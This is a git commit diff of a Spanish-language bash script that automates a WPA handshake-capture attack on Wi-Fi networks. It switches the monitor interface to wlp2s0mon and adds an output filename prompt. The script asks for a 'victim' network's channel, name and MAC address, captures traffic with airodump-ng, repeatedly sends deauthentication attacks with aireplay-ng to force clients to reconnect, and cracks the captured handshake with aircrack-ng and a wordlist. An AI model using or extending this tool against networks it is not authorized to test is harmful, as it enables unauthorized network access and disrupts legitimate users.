f09ec0148c51ce6fbec7c446be91fa8d48bbfe0b
MMAGANADEBIA <mmaganadebia@localhost.localdomain>
2020-08-21 14:40:22 -0500

    problem solving

--- handshake_automation.sh
+++ handshake_automation.sh
@@ -6,7 +6,7 @@ echo ""
 read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision
 
 firstTerminal(){
-  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac wlan0mon &
+  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $name wlp2s0mon &
 }
 
 aircrackInstall(){
@@ -40,7 +40,7 @@ deauthentication(){
   read -p "¿Quieres enviar otro ataque de desautenticación? (si / no) " deauth
   case $deauth in
     si)
-      sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
+      sudo aireplay-ng -0 10 -a $mac  -e $red wlp2s0mon
       deauthentication
       ;;
     no)
@@ -53,16 +53,16 @@ dictionariOrSave(){
   case $doc in
     D)
       read -p "Escribe la ruta del diccionario: " diccionario
-      xterm -hold -e sudo aircrack-ng "$red"'-01.cap' -w "$diccionario" &
+      xterm -hold -e sudo aircrack-ng "$name"'-01.cap' -w "$diccionario" &
       sudo service NetworkManager start
-      sudo airmon-ng stop wlan0mon
+      sudo airmon-ng stop wlp2s0mon
       exit
      ;;
     G)
       echo "Saliendo..."
       sleep 2s
       sudo service NetworkManager start
-      sudo airmon-ng stop wlan0mon
+      sudo airmon-ng stop wlp2s0mon
       exit
   esac
 }
@@ -75,17 +75,18 @@ case $firstDecision in
     echo "Matando procesos que pueden interferir..."
     sudo airmon-ng check kill
     echo "Poniendo interfaz en modo monitor..."
-    sudo airmon-ng start wlan0
+    sudo airmon-ng start wlp2s0
     echo "Escaneando redes..."
     echo "Puedes detener el escaneo cuando quieras con ctrl +c"
     sleep 5s
-    sudo airodump-ng wlan0mon 
+    sudo airodump-ng wlp2s0mon 
     read -p "Canal de la victima: " canal
     read -p "Nombre de la red: " red
-    read -p "Direccion MAC: " mac 
+    read -p "Direccion MAC: " mac
+    read -p "Nombre del archivo resultante: " name
     firstTerminal 
     sleep 5s 
-    sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
+    sudo aireplay-ng -0 10 -a $mac  -e $red wlp2s0mon
     deauthentication
     ;;
   no)
